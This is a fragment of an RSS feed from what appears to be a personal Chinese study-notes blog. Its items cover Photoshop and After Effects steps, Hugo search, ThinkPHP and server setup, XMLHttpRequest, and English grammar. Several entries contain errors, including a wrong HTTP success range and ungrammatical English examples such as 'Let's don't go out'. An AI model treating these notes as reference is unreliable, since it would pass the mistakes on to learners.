      <description>制作剪影  导入图像。 工具栏——快速选择工具。 建立选区。 属性栏——创建或调整选区——调整参数——输出设置——输出到：图层蒙版——确定。 图层面板——创建新的填充或调整图层——纯色——选择颜色——确定。 将纯色图层作为图像的背景。 复制一次图像层——Ctrl + J。 选择位于下方的图像层。 图层面板——添加图层样式——颜色叠加——调整颜色——确定。 移动工具——将位于下方的图像层调整到合适的位置。  </description>
    </item>
    
    <item>
      <title>制作灰度图</title>
      <link>https://note.yxzi.xyz/note/technology/software/photoshop/%E5%88%B6%E4%BD%9C%E7%81%B0%E5%BA%A6%E5%9B%BE/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/software/photoshop/%E5%88%B6%E4%BD%9C%E7%81%B0%E5%BA%A6%E5%9B%BE/</guid>
      <description>制作灰度图  新建——颜色模式——灰度。 工具栏——渐变工具——黑白渐变。 调整渐变样式。  </description>
    </item>
    
    <item>
      <title>博客添加搜索功能</title>
      <link>https://note.yxzi.xyz/note/technology/frame/hugo/%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/hugo/%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</guid>
      <description>博客添加搜索功能 HTML 代码 然后在网页内需要添加搜索栏的合适位置添加以下代码，一般放在顶部导航栏：
&amp;lt;div class=&amp;#34;search&amp;#34;&amp;gt; 	&amp;lt;i class=&amp;#34;material-icons search-icon search-start&amp;#34;&amp;gt;search&amp;lt;/i&amp;gt; 	&amp;lt;input type=&amp;#34;text&amp;#34; class=&amp;#34;search-input&amp;#34; placeholder=&amp;#34;Searching...&amp;#34; /&amp;gt; 	&amp;lt;i class=&amp;#34;material-icons search-icon search-clear&amp;#34;&amp;gt;clear&amp;lt;/i&amp;gt; 	&amp;lt;div class=&amp;#34;search-results&amp;#34;&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; 上面的clear是一个清除输入框内容的图标，search-results是用于输出匹配到的结果的板块；
CSS 代码 .search { 	position: relative; 	height: 30px; 	text-align: right; 	line-height: 30px; 	padding-right: 10px; }  .search .search-icon { 	float: right; 	height: 100%; 	margin: 0 10px; 	line-height: 30px; 	cursor: pointer; 	user-select: none; }  .</description>
    </item>
    
    <item>
      <title>双重曝光</title>
      <link>https://note.yxzi.xyz/note/technology/software/after-effects/%E5%8F%8C%E9%87%8D%E6%9B%9D%E5%85%89/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/software/after-effects/%E5%8F%8C%E9%87%8D%E6%9B%9D%E5%85%89/</guid>
      <description>双重曝光  导入绿幕抠像后的素材与背景 素材。 将背景素材放到抠像绿幕素材的下面。 背景素材——轨道遮罩—Alpha。  </description>
    </item>
    
    <item>
      <title>安装 ThinkPHP</title>
      <link>https://note.yxzi.xyz/note/technology/frame/thinkphp/%E5%AE%89%E8%A3%85-thinkphp/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/thinkphp/%E5%AE%89%E8%A3%85-thinkphp/</guid>
      <description>安装 ThinkPHP 安装 Composer 在 Windows 中，你需要下载并运行 Composer
安装 composer 时开启 openssl 配置，目录为（php.ini 配置文件的目录中的 php.exe）
比如 D:\phpstudy_pro\Extensions\php\php7.3.4nts
第一次报错  [Composer\Downloader\TransportException]curl error 28 while downloading https://repo.packagist.org/packages.json: Timeout was reached 解决方法：修改全局文件(推荐) composer config -g repo.packagist composer https://packagist.phpcomposer.com
第二次报错  [InvalidArgumentException]Could not find package topthink/think with version 6.0.x-dev. 切换 composer 镜像地址：阿里云镜像
composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
安装 Thinkphp 开发版 我们这里下载开发版的 ThinkPhp
composer create-project topthink/think=6.0.x-dev tp
在上一步创建的 tp 文件夹中执行 php think run（确保当前目录有 think 文件）</description>
    </item>
    
    <item>
      <title>登录宝塔</title>
      <link>https://note.yxzi.xyz/note/technology/linux/%E7%99%BB%E9%99%86%E5%AE%9D%E5%A1%94/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/linux/%E7%99%BB%E9%99%86%E5%AE%9D%E5%A1%94/</guid>
      <description>登录宝塔 前言 本文是我第一次使用服务器搭建网站后所写的，本文使用的是以下产品。
轻量云服务器 CentOS 7.6 64bit
Putty 用于 Windows 从本地登陆到远程 Linux 服务器
宝塔 下载 Putty 用 Putty 登陆到 Linux 配置 Putty  Host Name（IP address）：轻量应用服务器的公网 IP Port：轻量应用服务器的连接端口，必须设置为22。 Connect type：选择SSH. Saved Sessions：填写会话名称，例如 Rainy。 配置 “Host Name” 后，再配置 “Saved Sessions” 并 Save，则后续使用时可直接双击 “Saved Sessions” 下保存的会话名称登录到对应服务器。  输入用户名和密码   填写完成后单击 open，进入到 Putty 的运行界面，提示 login as.
  在login as后输入用户名，一般都是 root，按 Enter。
  输入密码，这里注意密码在输入时是不显示的，大家不要以为密码没输入，输入完成后按 Enter.
  登陆完成。
  安装宝塔 Centos 系统直接在登陆后 Putty 界面输入以下命令安装。</description>
    </item>
    
    <item>
      <title>绿幕抠像</title>
      <link>https://note.yxzi.xyz/note/technology/software/after-effects/%E7%BB%BF%E5%B9%95%E6%8A%A0%E5%83%8F/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/software/after-effects/%E7%BB%BF%E5%B9%95%E6%8A%A0%E5%83%8F/</guid>
      <description>绿幕抠像  导入图像。 新建合成——右击图层中的图像——效果——Keying——Keylight(1.2)。 Screen Color——吸管——点击图像中的绿色部分——关闭切换透明网格。 View——下拉框 Screen-Matte——增加 Screen Gain。 Screen-Matte——调整 Clip black/Clip White（使图像中的黑色和白色更加纯粹）。 View——下拉框 Final Result。 消除图像边缘的锯齿。 右击图层中的图像——效果——遮罩——简单阻塞工具——调整阻塞遮罩（使图像边缘的锯齿消除）。  </description>
    </item>
    
    <item>
      <title>裁剪图形</title>
      <link>https://note.yxzi.xyz/note/technology/software/photoshop/%E8%A3%81%E5%89%AA%E5%9B%BE%E5%83%8F/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/software/photoshop/%E8%A3%81%E5%89%AA%E5%9B%BE%E5%83%8F/</guid>
      <description>裁剪图形  导入图像。 解锁当前图像所在的图层。 菜单栏——图像——画布大小——调整参数——确定。 调整图像将要被被保留的部分。  </description>
    </item>
    
    <item>
      <title>Ajax XMLHttpRequest</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/xmlhttprequest/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/xmlhttprequest/</guid>
      <description>XMLHttpRequest 该对象用于与服务器交互；通过它可以在不重新刷新页面的情况下请求特定 URL，获取数据，这样就可以使得网页在不影响用户操作的情况下，更新页面的局部内容。
判断浏览器是否支持 XHR // 如果浏览器支持 XHR if (Xhr) { ... }else{  alert(&amp;#39;Sorry, your browser doesn\&amp;#39;t support XMLHttpXhr&amp;#39;); } 创建 XHR 对象 const xhr = new XMLHttpRequest(); 方法 readyState 返回 XMLHttpRequest 的当前所处状态的 状态码。
 0 表示 XHR 对象已经被创建，但尚未调用 open() 方法。 1 表示 open 方法已经被调用完毕。 2 表示 send 方法已经被调用完毕，并且头部和状态已经可获得。 3 表示服务端已经返回了部分结果，但并没有返回所有结果，且 ResponseText 属性已经包含部分数据。 4 表示服务端已经返回了所有结果。  status 返回 XMLHttpRequest 响应时的数字状态码。
200，状态码 &amp;gt;= 200 且 &amp;gt; 300 都算请求成功。
404
403</description>
    </item>
    
    <item>
      <title>English A4 纸泛背单词法</title>
      <link>https://note.yxzi.xyz/note/subject/english/a4-%E7%BA%B8%E6%B3%9B%E8%83%8C%E5%8D%95%E8%AF%8D%E6%B3%95/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/a4-%E7%BA%B8%E6%B3%9B%E8%83%8C%E5%8D%95%E8%AF%8D%E6%B3%95/</guid>
      <description>A4 纸泛背法 适用于在短时间内记住某个单词的中文翻译等。
开始  在一张空白 A4 纸的任意地方写出这个单词 看着单词并默念五遍其翻译 接着找一个空白处写出下一个单词，执行步骤 2 回到上一个单词，执行步骤 2，相当于将上一个单词复习一遍 根据自身情况可以改变单词默念的次数以及复习的次数  核心 快速的记忆，多次的重复。
睡前复习一次旧单词，醒来复习一次旧单词，日常复习一次旧单词，并背当天的 新单词
每次背单词注意力一定要高度集中，努力去看单词长啥样。
缺点 大概率不会读也不会写，但你在阅读中碰见了能知道它的意思。
艾宾浩斯记忆周期</description>
    </item>
    
    <item>
      <title>English How</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E6%84%9F%E5%8F%B9%E5%8F%A5/how/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E6%84%9F%E5%8F%B9%E5%8F%A5/how/</guid>
      <description>How how +形容词/副词 + 主语 + 谓语
How careful he is！（他多细心啊！)
How fast he runs！（他跑得多快啊！）
how + 形容词 + 冠词(a、an) + 可数名词的单数 + 主语 + 谓语
How cute a dog it is!(它是多么可爱的一只狗啊！)</description>
    </item>
    
    <item>
      <title>English What</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E6%84%9F%E5%8F%B9%E5%8F%A5/what/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E6%84%9F%E5%8F%B9%E5%8F%A5/what/</guid>
      <description>What what + 冠词（a、an） + 形容词 + 可数名词的单数 + 主语 + 谓语
What a beautiful photo it is!（这照片它多美啊！）
what + 形容词 + 不可数名词/名词复数 + 主语 + 谓语
What cleanly water it is!（多干净的水啊！）
What brilliant dogs they are!（多聪明的狗啊！）</description>
    </item>
    
    <item>
      <title>English 一般疑问句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E4%B8%80%E8%88%AC%E7%96%91%E9%97%AE%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E4%B8%80%E8%88%AC%E7%96%91%E9%97%AE%E5%8F%A5/</guid>
      <description>一般疑问句 可以用 yes、no 回答。
一般疑问句通常是由陈述句变过来的，下面列举陈述句变一般疑问句的几种方式。
提前系动词（be 动词、感官动词） 主 + 系 + 表 ——&amp;gt; 系 + 主 + 表
陈述句：You are an idiot.（你是个笨蛋）
一般疑问句：Are you an idiot?（你是不是个笨蛋？）
回答：Yes,i am./No,i am not.
提前助动词（do、have、shall 等） 主 + 谓 +（宾）——&amp;gt; 助动词 + 主 + 动词原形 + 其他
陈述句：You（have got light bulbs.（你有灯泡）
一般疑问句：（Have）you got light bulbs?（你有灯泡吗？）
回答：Yes,i have./No,i have not.
提前情态动词（can、may、will） 主 + 情态动词 + 动词原形 + 其他 ——&amp;gt; 情态动词 + 主+ 动词原形 + 其他</description>
    </item>
    
    <item>
      <title>English 主系表</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E7%B3%BB%E8%A1%A8/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E7%B3%BB%E8%A1%A8/</guid>
      <description>主系表 主语 ＋ 系动词 ＋ 表语（形容主语）
系动词用于链接前面的主语和后面的表语。
所谓的“主系表”句型是描述静态的世界，即：什么是什么；
系动词 = be 动词（is、are、am） + 感官动词（看、听、闻、尝、感觉、似乎、抱持、证明）
系动词后面大部分是表语。
例句  The food is delicious. They are students. He fell asleep She is rich now. i am in Chinese now.  </description>
    </item>
    
    <item>
      <title>English 主语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E4%B8%BB%E8%AF%AD/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E4%B8%BB%E8%AF%AD/</guid>
      <description>主语 一个句子的主体，也可以说是一句话主要叙述的对象或者这句话主要讲的内容。
大部分代词都可以作主语，尤其是人称代词的主格，宾格不能作主语。
例句  I like watching TV Chinese is hard.  </description>
    </item>
    
    <item>
      <title>English 主谓</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93/</guid>
      <description>主谓 主语 ＋ 不及物动词。
 The universe remains. I can draw. He likes singing. I work every day. I run every day.  </description>
    </item>
    
    <item>
      <title>English 主谓双宾</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93%E5%8F%8C%E5%AE%BE/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93%E5%8F%8C%E5%AE%BE/</guid>
      <description>主谓双宾 主语 ＋ 谓语（双及物动词） + 间宾 ＋直宾。
双宾的特点是两个宾语都能承受这个动作（双及物动词），以及两个宾语都能被作为主语。如果不能都被作为主语，那这个句子就是宾补。
一个句子中的间宾和直宾都能被作为被动语态主语，且双宾必须是一个人一个物，那么这个句子就是双宾，否则是宾补。
 I give you money. Her father bought her a dictionary. I gave her a book yesterday.  </description>
    </item>
    
    <item>
      <title>English 主谓宾</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93%E5%AE%BE/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93%E5%AE%BE/</guid>
      <description>主谓宾 主体 ＋ 谓语（单及物动词） ＋ 动作的承受者。
所谓的“主谓宾”句型是描述动态的世界，即：什么做了什么。
 I love you. He took his bag and left. I read English every morning.  </description>
    </item>
    
    <item>
      <title>English 主谓宾宾补</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93%E5%AE%BE%E5%AE%BE%E8%A1%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93%E5%AE%BE%E5%AE%BE%E8%A1%A5/</guid>
      <description>主谓宾宾补 主语 + 谓语（少数特定的及物动词） ＋ 宾语 + 宾语补足语。
为什么要跟一个宾补，因为如果不跟宾补的话，句子的意思会不完整。
宾补中的宾语和宾补都是指同一个人或同一个事物，它们通常是同位语关系。
 I call her Mary. They ordered hamburger their lunch. I made her happy yesterday.  </description>
    </item>
    
    <item>
      <title>English 介词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D/</guid>
      <description>介词 用于表示位置，方向等，使句子形成结构，介词没有实际意义
主要用来表明名词和代词与其他句子成分的关系。
 I ate three apple with chopsticks.  介词也叫前置词，是一种虚词，不能单独做句子成分，一般只能用在名词或者代词、数词和动名词的前面。介词可以与这些词语构成介词短语，才能在句子红充当一个句子成分。
 In Guangxi. In the school. in 2023.  介词虽然数量不多，但是通常因为一个介词有好几十个意思，甚至是上百个，所以很难掌握，也很难区别。
比如最常用的介词 in，它的意义至少就有 6 个。
In 在&amp;hellip;地方 in China.
在&amp;hellip;里面  in my room.  表时间，在某年，某月  in 2023. in May.  在&amp;hellip;之后  in three days.  穿什么颜色的衣服  in red.  用&amp;hellip;语言  in English  介词的分类 简单介词 由一个单词组成的介词。
 in. after.  复合介词 由两个单词组成一个新词的介词。
 inside. into.</description>
    </item>
    
    <item>
      <title>English 代词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%A3%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%A3%E8%AF%8D/</guid>
      <description>代词 用于代替名词的词，从而避免对话或语句中重复名词。
 I am person. she is beautiful.  人称代词 用于指代人，当然，也有些人称代词页可以指代事物
i、it、you、he、she、we、they 等等都是人称代词。
它有主格和宾格，以及有第一人称（我）、第二人称、（你）第三人称（他）
主格 作主语的格式，主格才可以作主语，宾格不行。
人称代词的主格只有：i、we、you、she、he、it、they.
在句子里做主语或者表语
 They are students. He is very handsome. It is cheap.  注意，两个或者两个以上的人称代词主格的单数作并列主语的时候顺序为：
第二人称（你）——&amp;gt; 第三人称（他）——&amp;gt; 第一人称（我）
如果是复数，顺序是: we、you and they，比如：
 He and i are both form China. You and i both like beautiful girls. You and he and me are all good students.  宾格 作宾格的格式，宾格才可以作宾语。
做及物动词或者介词之后的宾语
 I tell her my name.</description>
    </item>
    
    <item>
      <title>English 冠词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%86%A0%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%86%A0%E8%AF%8D/</guid>
      <description>冠词 用于说明名词的意义，通常在名词前后，形成特指或泛指的作用，不能单独使用。
定冠词 定冠词 the，表示这个或那个，特指某个名词。可以修饰可数名词单数/复数名词，或不可数名词。
凡是特指某个事物的名词，都要加定冠词 a、an、the，反之，如果时泛指某类事物的名词，则不需要加冠词。
上文中重新提及的人或物之前  This car is popular, but the car isn’t cheap. I bought a book yesterday.The book is interesting. I know a friend.The friend is a doctor.  在谈话观方都知道的人或物之前  pass me the book, please! pass me the books, please! Pass the salt to me, please!  在有限定性后置定语修饰的名词之前  The center of the city. The people in the park.  在序数词之前  the first.</description>
    </item>
    
    <item>
      <title>English 反义疑问句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E5%8F%8D%E4%B9%89%E7%96%91%E9%97%AE%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E5%8F%8D%E4%B9%89%E7%96%91%E9%97%AE%E5%8F%A5/</guid>
      <description>反义疑问句 可以用 yes，no 回答。
前肯后否，前否后肯 陈述句部分是肯定，疑问句部分用否定句 He is your teacher, isn‘t he？(他是你的老师，不是吗？)
根据事实回答：Yes, he is
陈述句部分是否定，反义疑问句用肯定句 He isn‘t your teacher, is he？(他不是你的老师，是吗？)
根据事实回答：No, he isn’t
有祈使句的情况 用 will you 和 won’t you
Open the door, won’t you?
打开开门，不好吗？
Don’t open the door, will you?
不打开门，好吗？
不管否定肯定，let’s 开头结尾就是 shall we，Let us 开头结尾就是 will you
肯定：Let‘s go to school, shall we? Let us go outside, will you?
否定：Let‘s don’t go out, shall we?</description>
    </item>
    
    <item>
      <title>English 同位语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%90%8C%E4%BD%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%90%8C%E4%BD%8D/</guid>
      <description>同位语 用于将主语或宾语重新说一遍。使得两个不同的词语都表示同一个事物或人。
 Rainy,an english teacher,is very strict.  </description>
    </item>
    
    <item>
      <title>English 名词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E5%90%8D%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E5%90%8D%E8%AF%8D/</guid>
      <description>名词 表示人或物的名称。
 Rainy is a person  名词所有格 表示一种所有关系。
比如小明的书包，其中小明的就是所有格，因为书包是属于小明的。
表示人或动物的名词 + &amp;rsquo;s 这种名词所有格，构成的方式很容易，直接子表示人或动物的名词后面**+&amp;rsquo;s**就可以了，这里的 &amp;rsquo;s 相当于中文里的”的“。
一个普通名词，在变成所有格的时候，，要注意可数名词不能单独使用，比如 friend&amp;rsquo;s ；需要加一个限定词 my，变成My friend&amp;rsquo;s这样才能构成名词所有格。
作前置定语 Jack &amp;rsquo;s book
Jack &amp;rsquo;s books
The boss’s car
同时它作前置定语的时候可以修饰可数名词（单数和复数形式）和不可数名词。
复数名词 s 结尾，后加’ 如果名词是s结尾的复数或名词本身是s结尾， 直接加**&amp;rsquo;就可以了，当然也可以加&amp;rsquo;s**。
My boss&amp;rsquo;s 相当于 My boss&amp;rsquo;
of + 无生命的名词 不可数名词或复数直接+of。 Of water
Of oil
可数名词不能直接加 of，需要加限定词或冠词或变复数。 of相当于中文**“的”的意思，the相当于“这”**的意思
Of the house
Of my house
Of this coat
Of the carrot
被名词所有格作后置定语修饰的名词，都必须在这个名词前面+ the The price of the house.</description>
    </item>
    
    <item>
      <title>English 名词从句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E6%9D%82%E5%8F%A5/%E5%90%8D%E8%AF%8D%E4%BB%8E%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E6%9D%82%E5%8F%A5/%E5%90%8D%E8%AF%8D%E4%BB%8E%E5%8F%A5/</guid>
      <description>名词从句 主语从句 将简单句修改，使其可以充当另一个句子的主语。
 The fact is obvious. ——&amp;gt; That the rabbit ate a carrot is obvious. ——&amp;gt; It is obvious that the rabbit ate a carrot.  主语从句从都有引导词：that、whether、when、what、how 等。
 That the hungry rabbit had already eaten a carrot for dinner this evening is obvious.  这个句子显然头重脚轻了，因此得改为：
 It is obvious that the hungry rabbit had already carrot for dinner the evening is obvious.  这句话中的 It 指代的是 that the hungry rabbit had already carrot for dinner the evening。</description>
    </item>
    
    <item>
      <title>English 命令、警告</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%A5%88%E4%BD%BF%E5%8F%A5/%E5%91%BD%E4%BB%A4%E8%AD%A6%E5%91%8A/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%A5%88%E4%BD%BF%E5%8F%A5/%E5%91%BD%E4%BB%A4%E8%AD%A6%E5%91%8A/</guid>
      <description>命令、警告 Get out！（滚！）
Be quiet, please.（请安静）
Be careful（小心）</description>
    </item>
    
    <item>
      <title>English 复合句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E5%90%88%E5%8F%A5/%E5%A4%8D%E5%90%88%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E5%90%88%E5%8F%A5/%E5%A4%8D%E5%90%88%E5%8F%A5/</guid>
      <description>复合句 也叫并列句， 句与句之间没有主次之分</description>
    </item>
    
    <item>
      <title>English 复杂句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E6%9D%82%E5%8F%A5/%E5%A4%8D%E6%9D%82%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E6%9D%82%E5%8F%A5/%E5%A4%8D%E6%9D%82%E5%8F%A5/</guid>
      <description>复杂句 表示用简单句所组成的从属关系的句子；也就是表示一个句子套另一个句子，这两个句子分别叫做主句和从句。</description>
    </item>
    
    <item>
      <title>English 定语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%AE%9A%E8%AF%AD/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%AE%9A%E8%AF%AD/</guid>
      <description>定语 用于修饰名词或代词，也可以说定语是广义的形容词，通常情况，哪里有名词，哪里就有定语。
定语可以将名词具体化，缩小名词的范围.比如你去帮我买香蕉，这句话并不具体，因为没有表示要买多少根香蕉，或者买什么种类的香蕉，因此，我们需要加上一些具体的词，使我们的句子更加合理化，这些词就是定语。
在英语中，普通名词才能用定语修饰 ，专有名词是不能用定语修饰的，特殊情况除外。
同一个普通名词，可以有多个定语修饰。
 The little white rabbit ate a large carrot. One book a bottle of water Two beautiful girls  前置定语 放在名词前面修饰名词的词语。
后置定语 放在名词后面修饰名词的词语。</description>
    </item>
    
    <item>
      <title>English 宾补</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%AE%BE%E8%A1%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%AE%BE%E8%A1%A5/</guid>
      <description>宾补 对宾语进行补充说明，使得句子意思完整。
宾补只跟宾语有关系，跟主语没关系。
 He made the English class funny I make you rich. We keep the room clean.  </description>
    </item>
    
    <item>
      <title>English 宾语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%AE%BE%E8%AF%AD/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%AE%BE%E8%AF%AD/</guid>
